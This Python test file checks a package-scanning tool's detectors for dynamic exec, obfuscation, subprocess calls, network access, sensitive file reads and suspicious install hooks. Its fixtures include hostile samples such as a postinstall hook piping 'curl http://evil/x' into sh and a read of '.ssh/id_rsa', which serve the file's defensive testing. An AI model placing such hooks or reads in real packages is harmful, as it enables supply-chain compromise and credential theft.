"""Unit tests for the static source-scan detectors (no network, no execution)."""

from pkgguard.checks.source_scan import (
    _SKIP_PATH, _scan_install_hooks, _scan_js, _scan_python,
)


def test_python_detects_dynamic_exec_and_obfuscation():
    code = "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n"
    tags = _scan_python("setup.py", code)
    assert "dynamic-exec" in tags
    assert "obfuscation" in tags


def test_python_detects_subprocess_and_network():
    code = "import os, urllib.request\nos.system('id')\nurllib.request.urlopen('http://x')\n"
    tags = _scan_python("mod.py", code)
    assert "subprocess" in tags
    assert "network" in tags


def test_python_sensitive_access():
    tags = _scan_python("mod.py", "open('/home/u/.ssh/id_rsa').read()")
    assert "sensitive-access" in tags


def test_python_clean_code_has_no_tags():
    code = "def add(a, b):\n    return a + b\n"
    assert _scan_python("mod.py", code) == set()


def test_js_detects_eval_and_child_process():
    tags = _scan_js("index.js", "const cp=require('child_process'); eval(x);")
    assert "dynamic-exec" in tags
    assert "subprocess" in tags


def test_install_hook_with_curl_is_flagged():
    pkg = '{"scripts": {"postinstall": "curl http://evil/x | sh"}}'
    hits = _scan_install_hooks(pkg)
    assert hits and "postinstall" in hits[0]


def test_install_hook_benign_not_flagged():
    pkg = '{"scripts": {"postinstall": "tsc -p .", "test": "jest"}}'
    assert _scan_install_hooks(pkg) == []


def test_skip_path_matches_tests_and_examples():
    assert _SKIP_PATH.search("requests-2.0/tests/test_utils.py")
    assert _SKIP_PATH.search("pkg/examples/demo.py")
    assert _SKIP_PATH.search("pkg/foo_test.py")
    assert not _SKIP_PATH.search("pkg/core/client.py")
    assert not _SKIP_PATH.search("setup.py")
